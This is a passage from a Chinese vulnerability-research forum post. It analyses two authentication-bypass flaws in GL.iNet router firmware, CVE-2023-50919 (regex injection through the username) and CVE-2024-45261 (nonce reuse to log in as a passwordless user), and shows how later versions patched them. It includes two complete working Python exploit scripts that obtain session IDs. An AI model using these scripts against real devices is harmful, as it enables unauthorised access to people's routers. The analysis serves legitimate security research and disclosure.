可以看到拼接正则表达式没有对用户名进行检查，那么就可以在用户名中带有正则字符串，让匹配结果不再是我们不知道的管理员密码哈希信息，而是一个可以猜到的固定值，便可轻易绕过登录。看一下 root 用户的密码信息，比如为 root:1qG8FMa7V$BycGN7ybNp4Np/PkCQNp9.:20030:0:99999:7:::，第三个字段为最后一次修改密码时间距离 1970.01.01 的天数，是变化不容易预测的，而第四个字段为最小修改密码时间间隔，如果是 0 则可以随时修改，一般默认是 0，那么则可以让用户名为`root:[^:]+:[^:]+`，来拼接出正则表达式规则`^root:[^:]+:[^:]+:([^:]+)`，便可匹配出第四个字段 0，接着可以根据校验流程计算出哈希，发送登录请求绕过验证，获取到 sid。

![](https://bbs.kanxue.com/upload/attach/202411/802108_54C8FYZSP3WV8KS.png)

```
#CVE-2023-50919.py
import requests
import hashlib
 
requests.packages.urllib3.disable_warnings()
s = requests.Session()
s.verify = False
s.keep_alive = True
s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'})
 
url = "http://192.168.122.130/rpc"
j = {"jsonrpc":"2.0","id":1,"method":"challenge","params":{"username":"root"}}
r = s.post(url, json=j)
if r.status_code == 200 and "Access denied" not in r.text and "nonce" in r.json()['result']:
    nonce = r.json()['result']['nonce']
    data = f'root:[^:]+:[^:]+:0:{nonce}'
    hash = hashlib.md5(data.encode()).hexdigest()
    j = {"jsonrpc":"2.0","id":1,"method":"login","params":{"username":"root:[^:]+:[^:]+","hash":hash}}
    r = s.post(url, json=j)
    try:
        sid = r.json()['result']['sid']
    except Exception:
        pass
    if sid:
        print("[*] Successfully generated a non-privileged SID: \033[1m%s\033[0m" %sid)
 
    else:
        print("[*] Error! Could not generate a SID!")
else:
    print("[*] Could not get a nonce from the target device! Try again later!")
```

**CVE-2024-45261**
------------------

下载修复版本 v4.5.0 固件，解包查看是 CVE-2023-50919 如何修复的，可以看到对 username 进行了正则检查，严格限定为小写字母、数组、下划线和连字符，堵死了利用用户名拼接正则表达式的漏洞。

![](https://bbs.kanxue.com/upload/attach/202411/802108_6BXF3PSCZW7Y346.png)

但是真的安全了吗，其实并没有。再往上翻一下 / etc/shadow 文件的内容，可以知道除了 root 还有 ftp、daemon、network 等其他用户的密码信息，而且匹配出来的哈希要么是 * 要么是 x，所以 rpc - login 请求是很容易搞定的，登录 / etc/shadwo 文件中的其他用户名即可。但是还要看下 rpc - challenge 请求流程，因为有先通过 get_crypt_info 读用户在 / etc/shadwo 文件中的哈希类型和盐，如果是 root 外的用户，获取到的 alg 和 salt 就是 nil，进而校验了 alg 值会请求失败，无法产生随机数 nonce 并返回。

![](https://bbs.kanxue.com/upload/attach/202411/802108_S2GBHVY2UGDDSH8.png)

可是问题恰恰出现在 rpc - login 请求中使用 nonce 时候，并没有检查是哪个用户生成的 nonce，所以我们可以进行 rpc - challenge 请求时候，设置用户名为 root 来获取到 nonce，再进行 rpc - login 请求时候，设置别的用户来绕过校验，这就是 CVE-2024-45261，[官网上有具体的介绍]([https://github.com/gl-inet/CVE-issues/blob/main/4.0.0/Bypassing](https://github.com/gl-inet/CVE-issues/blob/main/4.0.0/Bypassing) Login Mechanism with Passwordless User Login.md)，github 上也有 [poc 脚本](https://github.com/aggressor0/GL.iNet-Exploits/blob/main/CVE-2024-45261.py)。

![](https://bbs.kanxue.com/upload/attach/202411/802108_BGURUJPG3BU7GDE.png)

```
#CVE-2024-45261.py
import requests
import hashlib
 
requests.packages.urllib3.disable_warnings()
s = requests.Session()
s.verify = False
s.keep_alive = True
s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'})
 
url = "http://192.168.122.130/rpc"
j = {"jsonrpc":"2.0","id":1,"method":"challenge","params":{"username":"root"}}
r = s.post(url, json=j)
if r.status_code == 200 and "Access denied" not in r.text and "nonce" in r.json()['result']:
    nonce = r.json()['result']['nonce']
    data = f'ftp:*:{nonce}'
    hash = hashlib.md5(data.encode()).hexdigest()
    j = {"jsonrpc":"2.0","id":1,"method":"login","params":{"username":"ftp","hash":hash}}
    r = s.post(url, json=j)
    try:
        sid = r.json()['result']['sid']
    except Exception:
        pass
    if sid:
         print("[*] Successfully generated a non-privileged SID for the \033[1mftp\033[0m account: \033[1m%s\033[0m" %sid)
    else:
        print("[*] Error! Could not generate a SID!")
else:
    print("[*] Could not get a nonce from the target device! Try again later!")
```

最后看下当前最新的 v4.6.6 版本中是怎么修复的，可以看到 nonce 和 username 对应关系有了，root 外的用户无法再借助 root 通过 rpc - challenge 请求生成的 nonce 来绕过登录了。

![](https://bbs.kanxue.com/upload/attach/202411/802108_S7GRV7DS6RBAYGJ.png)

顺便再看下 CVE-2024-45261 即任意 aclgroup 的 sid 任意文件下载漏洞是怎么修复的，可以看到调用了之前说到的 rpc.access 方法，之前有提到里面有对 sid 的 aclgroup 进行检查。

![](https://bbs.kanxue.com/upload/attach/202411/802108_RR8GHH4T57SNAW3.png)

**后记**
======

写完此篇文章一个感受是 “纸上得来终觉浅，绝知此事要躬行”，无论是固件仿真，还是自己去找一些授权后注入漏洞，或者是复现授权相关 CVE，都是看着觉得也不难，但动手复现起来真是一个又一个坑。看到别人做得不太好的，要摸索下怎么做得更优雅些；碰到别人没说的，要自己趟一遍水才知道哪些没说，再想各种办法去补全；碰到别人说得有问题的就更惨了，各种怀疑困惑后，要一步步分析定位到原因再去解决给出正确答案。

[[培训] 内核驱动高级班，冲击 BAT 一流互联网大厂工作，每周日 13:00-18:00 直播授课](https://www.kanxue.com/book-section_list-173.htm)

[#安全研究](forum-128-1-167.htm) [#固件分析](forum-128-1-170.htm) [#漏洞分析](forum-128-1-171.htm) [#家用设备](forum-128-1-173.htm)